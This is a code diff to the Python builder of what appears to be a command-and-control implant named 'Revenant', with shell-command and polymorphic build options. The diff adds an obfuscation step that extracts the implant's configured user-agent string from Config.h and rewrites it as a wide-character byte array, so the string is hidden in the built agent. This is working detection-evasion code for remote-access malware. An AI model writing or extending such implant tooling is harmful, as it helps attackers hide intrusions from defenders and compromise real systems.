@@ -197,6 +197,38 @@ def process_config_h(config: dict):
             f.write(header_file)
 
 
+def read_and_extract_config_user_agent(file_path: str) -> str:
+    with open(file_path, 'r') as f:
+        content = f.read()
+        match = re.search(r'#define CONFIG_USER_AGENT L"(.+)"', content)
+        if match:
+            return match.group(1)
+    return None
+
+
+def wide_char_bytes(s: str, encoding: str = 'utf-16-le') -> str:
+    wide_char = s.encode(encoding)
+    return ', '.join(f'0x{byte:02x}' for byte in wide_char)
+
+
+def replace_config_user_agent(file_path: str, wide_char_bytes: str):
+    with open(file_path, 'r') as f:
+        content = f.read()
+
+    content = re.sub(r'(#define CONFIG_USER_AGENT L)".+(")', rf'#define CONFIG_USER_AGENT {{ {wide_char_bytes} }}', content)
+
+    with open(file_path, 'w') as f:
+        f.write(content)
+
+
+def obf_user_agent():
+    file_path = './Agent/Include/Config.h'
+    config_user_agent = read_and_extract_config_user_agent(file_path)
+    if config_user_agent:
+        config_user_agent_wide_char_bytes = wide_char_bytes(config_user_agent)
+        replace_config_user_agent(file_path, config_user_agent_wide_char_bytes)
+
+
 class CommandShell(Command):
     def __init__(self):
         self.CommandId: int = COMMAND_SHELL
@@ -333,6 +365,7 @@ class Revenant(AgentType):
 
         if self.BuildingConfig["Obfuscation"]:
             process_strings_h()
+            obf_user_agent()
             print("[*] Configuring String.h header...")
 
         if self.BuildingConfig["Polymorphic"]:
